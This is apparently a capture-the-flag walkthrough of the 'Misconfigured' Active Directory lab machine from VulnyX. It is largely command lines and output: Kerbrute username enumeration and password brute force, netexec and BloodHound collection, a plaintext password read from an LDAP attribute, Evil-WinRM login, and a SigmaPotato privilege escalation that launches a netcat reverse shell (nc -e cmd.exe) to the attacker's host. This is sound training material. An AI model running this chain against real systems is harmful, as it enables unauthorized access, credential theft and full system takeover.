# URL
https://vulnyx.com/#misconfigured
# Concepts
* Windows Active Directory hacking
* creating custom username lists
* username bruteforce
* Bloodhound enumeration
* SeImpersonatePrivilege Abuse
* Potato Attack
# Method of solve
## Initial Scans
* the Nmap scan on this host shows typical Active Directory domain controller ports open, but also port 80, which is uncommon on Windows server:
* Netexec null sessions work on this server, which reveals a domain name, `allsafe.nyx`:
```
└─$ nxc smb 192.168.212.20 -u '' -p ''          
SMB         192.168.212.20  445    MISCONFIGURED    [*] Windows 10 / Server 2019 Build 17763 x64 (name:MISCONFIGURED) (domain:allsafe.nyx) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         192.168.212.20  445    MISCONFIGURED    [+] allsafe.nyx\:
```
* we add this to our `/etc/hosts` file
## Username Enumeration
* we want to do username enumeration, and the name of the domain points to the `Mr. Robot` TV show
* we can get a list of characters (their full names) from that show and use the `username-ananarchy` tool to create a list of possible username strings for those characters:
  * `https://github.com/urbanadventurer/username-anarchy`
* first, we'll create a list of names from the show:
```
Elliot Alderson
Darlene Alderson
Edward Alderson
Magda Alderson
Angela Moss
Tyrell Wellick
Joanna Wellick
Phillip Price
Dominique DiPierro
Zhang Min
Romero Ismael
Mobley Thompson
Trenton Ahmed
Cisco Ramirez
Leon Irving
Terry Colby
Scott Knowles
Sharon Knowles
Susan Jacobs
Frank Cody
Santiago Ortiz
Derek Fales
Freddy Lomax
Grant Cheng
Irving Rosenfeld
Janice
Shayla Nico
```
* then we'll use the tool to create the list of potential username strings:
```
./username-anarchy --input-file ./mr_robot.txt > usernames.txt
```
* we can then use another tool `Kerbrute` to fuzz the server's Kerberos service for valid usernames
  * `https://github.com/ropnop/kerbrute/`
* this is the command syntax for user enumeration with `Kerbrute`:
```
└─$ ./kerbrute_linux_amd64 userenum --dc 192.168.212.20 -d allsafe.nyx usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/24/26 - Ronnie Flathers @ropnop

2026/01/24 10:06:22 >  Using KDC(s):
2026/01/24 10:06:22 >   192.168.212.20:88

2026/01/24 10:06:22 >  [+] VALID USERNAME:       a.moss@allsafe.nyx
```
* from the output, we see that `a.moss` is a valid user on the server
## User Password Brute-Force
* now that we have a username, we can attempt to brute force their password through Kerberos using the same tool, `Kerbrute`:
```
└─$ ./kerbrute_linux_amd64 bruteuser --dc 192.168.212.20 -d allsafe.nyx /usr/share/wordlists/rockyou.txt a.moss

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/24/26 - Ronnie Flathers @ropnop

2026/01/24 10:09:25 >  Using KDC(s):
2026/01/24 10:09:25 >   192.168.212.20:88

2026/01/24 10:09:31 >  [+] VALID LOGIN:  a.moss@allsafe.nyx:Password1
```
* we now have full credentials for the `a.moss` user on the server
## Full User Enumeration
* we can use the SMB service to retrieve a more-complete usernames list now that we have full credentials for the `a.moss` user:
```
└─$ nxc smb 192.168.212.20 -u 'a.moss' -p 'Password1' --users    
SMB         192.168.212.20  445    MISCONFIGURED    [*] Windows 10 / Server 2019 Build 17763 x64 (name:MISCONFIGURED) (domain:allsafe.nyx) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         192.168.212.20  445    MISCONFIGURED    [+] allsafe.nyx\a.moss:Password1 
SMB         192.168.212.20  445    MISCONFIGURED    -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.212.20  445    MISCONFIGURED    Administrator                 2026-01-24 04:20:37 0       Built-in account for administering the computer/domain
SMB         192.168.212.20  445    MISCONFIGURED    Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.212.20  445    MISCONFIGURED    krbtgt                        2025-10-06 09:25:27 0       Key Distribution Center Service Account
SMB         192.168.212.20  445    MISCONFIGURED    a.moss                        2025-10-06 09:40:36 0       Community Manager
SMB         192.168.212.20  445    MISCONFIGURED    c.slater                      2025-10-06 11:15:09 0       IT Department
```
* looks like there's only one other user of note here, `c.slater`
## Bloodhound Enumeration
* in addition to full username enumeration, having access to a domain user account also lets us ingest data for the `Bloodhound` tool
```
└─$ nxc ldap 192.168.212.20 -u a.moss -p 'Password1' --bloodhound --collection All --dns-server 192.168.212.20
LDAP        192.168.212.20  389    MISCONFIGURED    [*] Windows 10 / Server 2019 Build 17763 (name:MISCONFIGURED) (domain:allsafe.nyx) (signing:None) (channel binding:No TLS cert)
LDAP        192.168.212.20  389    MISCONFIGURED    [+] allsafe.nyx\a.moss:Password1 
LDAP        192.168.212.20  389    MISCONFIGURED    Resolved collection methods: acl, group, psremote, localadmin, dcom, objectprops, container, session, rdp, trusts                       
LDAP        192.168.212.20  389    MISCONFIGURED    Done in 0M 0S
LDAP        192.168.212.20  389    MISCONFIGURED    Compressing output into /home/theshyhat/.nxc/logs/MISCONFIGURED_192.168.212.20_2026-01-24_101846_bloodhound.zip
```
* now we can use `Bloodhound` to enumerate the data:
* when we look at the user details for the `c.slater` user, we see something very odd
* we can recreate how this info would be retrieved with `netexec`:
```
└─$ nxc ldap 192.168.212.20 -u a.moss -p 'Password1' --query "(sAMAccountName=c.slater)" ""
LDAP        192.168.212.20  389    MISCONFIGURED    [*] Windows 10 / Server 2019 Build 17763 (name:MISCONFIGURED) (domain:allsafe.nyx) (signing:None) (channel binding:No TLS cert)
LDAP        192.168.212.20  389    MISCONFIGURED    [+] allsafe.nyx\a.moss:Password1 
LDAP        192.168.212.20  389    MISCONFIGURED    [+] Response for object: CN=Christian Slater,CN=Users,DC=allsafe,DC=nyx
LDAP        192.168.212.20  389    MISCONFIGURED    objectClass          top
LDAP        192.168.212.20  389    MISCONFIGURED                         person
LDAP        192.168.212.20  389    MISCONFIGURED                         organizationalPerson
LDAP        192.168.212.20  389    MISCONFIGURED                         user
LDAP        192.168.212.20  389    MISCONFIGURED    cn                   Christian Slater
LDAP        192.168.212.20  389    MISCONFIGURED    sn                   Slater
LDAP        192.168.212.20  389    MISCONFIGURED    description          IT Department
LDAP        192.168.212.20  389    MISCONFIGURED    userPassword         P@zzW0rd2025!
```
## Initial Access: WinRM
* so we now have access to the `c.slater` account, we can login as this user with the Winrm service, since we found that this user is part of the following group:
```
LDAP        192.168.212.20  389    MISCONFIGURED    memberOf             CN=Remote Management Users,CN=Builtin,DC=allsafe,DC=nyx
```
* we login with the `Evil-Winrm` tool:
```
evil-winrm -i 192.168.212.20 -u 'c.slater' -p 'P@zzW0rd2025!'
```
* once in, we notice that this user has unusual privileges on the system:
```
*Evil-WinRM* PS C:\Users\c.slater\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```
## Privilege Escalation: SeImpersonatePrivilege and SigmaPotato
* `SeImpersonatePrivilege` is a powerful privilege for a user, and can be used to obtain `NT AUTHORITY / SYSTEM` level access
* to determine which exploit tool to use for privilege escalation, we need to know what version of Windows is being used:
```
*Evil-WinRM* PS C:\Users\c.slater\Documents> Get-ComputerInfo -Property "WindowsProductName", "WindowsVersion"

WindowsProductName                      WindowsVersion
------------------                      --------------
Windows Server 2019 Standard Evaluation 1809
```
* a popular tool for abusing `SeImpersonatePrivilege` on Windows 10 systems is `Sigma Potato`
  * `https://github.com/tylerdotrar/SigmaPotato/`
* once uploaded this, as well as a netcat Windows binary to the target, we can combine the two to get an elevated shell from the target:
```
C:\Users\c.slater> .\sigmapotato.exe "c:\users\c.slater\nc.exe 192.168.212.10 
443 -e cmd.exe"
```
Finis
